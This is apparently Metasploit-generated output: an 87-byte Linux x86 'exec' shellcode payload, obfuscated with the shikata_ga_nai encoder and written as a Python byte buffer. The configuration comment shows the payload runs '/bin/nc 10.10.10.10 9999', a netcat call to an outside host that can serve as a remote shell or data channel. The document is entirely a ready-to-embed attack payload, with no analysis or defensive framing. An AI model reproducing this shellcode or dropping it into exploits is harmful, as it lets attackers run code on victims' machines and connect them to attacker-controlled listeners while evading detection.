# linux/x86/exec - 87 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, MeterpreterDebugLevel=0, 
# RemoteMeterpreterDebugFile=, CMD=/bin/nc 10.10.10.10 9999
buf =  b""
buf += b"\xb8\x66\x35\xa6\xf3\xda\xc6\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x10\x31\x43\x12\x03\x43\x12\x83\xa5\x31\x44"
buf += b"\x06\x43\x31\xd0\x70\xc1\x23\x88\xaf\x86\x22\xaf\xd8"
buf += b"\x67\x46\x58\x19\x1f\x87\xfa\x70\xb1\x5e\x19\xd0\xa5"
buf += b"\x78\xde\xd5\x35\x54\xbc\xbc\x5b\x85\x2e\x5c\x83\xe8"
buf += b"\x9e\x8c\xf2\x3a\xf1\xe1\xc4\x14\x3c\x32\x04\x50\x07"
buf += b"\x0b\x7d\xa2\x20\x38\xf4\x43\x03\x3e"
